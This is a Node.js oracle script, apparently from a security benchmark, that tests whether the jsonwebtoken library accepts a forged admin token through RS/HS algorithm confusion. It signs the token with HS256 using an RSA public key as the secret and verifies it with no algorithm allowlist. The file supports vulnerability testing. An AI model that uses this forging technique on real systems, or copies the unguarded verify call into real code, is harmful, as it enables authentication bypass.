let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function b64url(obj) {
  return Buffer.from(JSON.stringify(obj))
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  }));
}

try {
  const jwt = require('jsonwebtoken');

  // Benign control: normal HS256 sign/verify must work first.
  const secret = 'oracle-hs256-secret';
  const controlPayload = { sub: 'control-user', role: 'user' };
  const controlToken = jwt.sign(controlPayload, secret, { algorithm: 'HS256' });
  const controlOut = jwt.verify(controlToken, secret, { algorithms: ['HS256'] });
  if (!controlOut || controlOut.sub !== 'control-user' || controlOut.role !== 'user') {
    throw new Error('benign HS256 verify did not return expected payload');
  }

  operation_completed = true;

  // Attack: RS/HS confusion using public key material as HMAC secret.
  // Vulnerable behavior: token signed with HS256 using RSA public key string verifies
  // when verifier is given that same public key and no algorithms allowlist.
  const publicKeyPem = [
    '-----BEGIN PUBLIC KEY-----',
    'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK9j3wQm2f4m7v5v0zzakDx4zY/boYYy',
    '6bwyZhH4qzM0gc3KJ2YMBX1AHzrc4c3OJbGdv8ImZ/Sc7VcRbP5hqjMCAwEAAQ==',
    '-----END PUBLIC KEY-----'
  ].join('\n');

  const forgedPayload = { sub: 'attacker', admin: true, oracle: 'rs-hs-confusion' };
  const forgedToken = jwt.sign(forgedPayload, publicKeyPem, { algorithm: 'HS256' });

  try {
    const out = jwt.verify(forgedToken, publicKeyPem);
    if (out && out.admin === true && out.sub === 'attacker') {
      exploit_succeeded = true;
      evidence = 'forged HS256 token verified using RSA public key material';
    } else {
      exploit_succeeded = true;
      evidence = 'forged token accepted (unexpected payload shape)';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'forged token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

emit();